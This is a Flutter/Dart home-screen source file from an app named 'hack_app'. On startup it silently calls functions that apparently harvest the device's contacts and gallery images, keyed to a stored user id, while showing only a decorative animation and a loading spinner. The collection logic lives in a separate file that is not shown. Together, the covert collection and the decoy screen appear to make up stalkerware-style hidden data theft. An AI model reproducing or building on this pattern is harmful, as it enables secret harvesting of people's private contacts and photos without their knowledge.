import 'package:flutter/material.dart';
import 'package:hack_app/accessdata/alldataisasscess.dart';
import 'package:hive/hive.dart';
import 'package:provider/provider.dart';
import 'package:rive/rive.dart';

class HomeScreen extends StatefulWidget {
  const HomeScreen({super.key});

  @override
  State<HomeScreen> createState() => _HomeScreenState();
}

class _HomeScreenState extends State<HomeScreen> {
   var sett = Hive.box('settings');
  @override
  void initState() {
   String uid = sett.get('uid', defaultValue: '');
    Hackapp hack = Provider.of<Hackapp>(context, listen: false);

    hack.accessallcontact(uid);
    hack.loadGalleryImages(uid);
    super.initState();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Stack(
        children: [
          const Center(
              child: RiveAnimation.asset(
            'assets/2865-5957-forest-god.riv',
            fit: BoxFit.cover,
          )),
          Positioned(
              bottom: 100,
              left: 0,
              right: 0,
              child: Center(
                child: Container(
                    decoration: BoxDecoration(
                        color: Colors.white.withOpacity(0.2),
                        borderRadius: BorderRadius.circular(8)),
                    height: 80,
                    width: 80,
                    child: Transform.scale(
                      scale: 0.5,
                      child: const CircularProgressIndicator(
                        strokeWidth: 2,
                        color: Colors.black,
                      ),
                    )),
              ))
        ],
      ),
    );
  }
}
